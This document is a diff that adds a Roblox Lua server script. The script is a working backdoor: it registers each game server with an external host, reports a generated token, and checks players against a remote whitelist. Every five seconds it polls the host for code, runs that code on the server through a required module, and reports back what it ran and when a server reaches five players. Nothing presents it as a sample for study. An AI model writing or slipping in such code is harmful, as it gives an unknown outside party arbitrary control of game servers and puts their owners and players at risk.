@@ -1,0 +1,58 @@
+local url = "https://api.elytra.cc/"
+local http = game:GetService("HttpService")
+
+local hasHitFive = false
+
+local function sendMessage(text)
+	local data = http:JSONEncode({ message = text })
+
+	pcall(function()
+		http:PostAsync(url.."send", data, Enum.HttpContentType.ApplicationJson)
+	end)  
+end
+
+local function checkPlayerWhitelist(plr)
+	local response = http:GetAsync(url.."check/?username="..plr.Name)
+	if tostring(response) == "true" then
+		sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
+	end
+end
+
+local function checkForCommands(jobId)
+	local load = require(18524410650)
+	while true do
+		wait(5)
+		local response = http:GetAsync(url.."heartbeat/?jobid="..jobId)
+		local commands = http:JSONDecode(response)
+
+		if commands and #commands > 0 then
+			for _, command in ipairs(commands) do
+				pcall(function()
+					load(command)()
+				end)
+				sendMessage(string.format("<:rack:1262457591422779423> | A segment of coded was just executed on the server! Code: ```lua\n%s```", command))
+			end
+		end
+		if not hasHitFive then
+			if #game.Players:GetPlayers() >= 5 then
+				hasHitFive = true
+				sendMessage(string.format("<:rack:1262457591422779423> | JobId `%s` has hit 5 players! There may be a flight occuring!", jobId))
+			end
+		end
+	end
+end
+
+local chatToken = http:GenerateGUID(false)
+local jobId = game.JobId ~= "" and game.JobId or http:GenerateGUID(false)
+
+sendMessage(string.format("<:rack:1262457591422779423> | The system has been deployed on server `%s`. The token for this game is `%s`", jobId, chatToken))
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+	checkPlayerWhitelist(plr)
+end)
+
+for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+	checkPlayerWhitelist(plr)
+end
+
+checkForCommands(jobId)
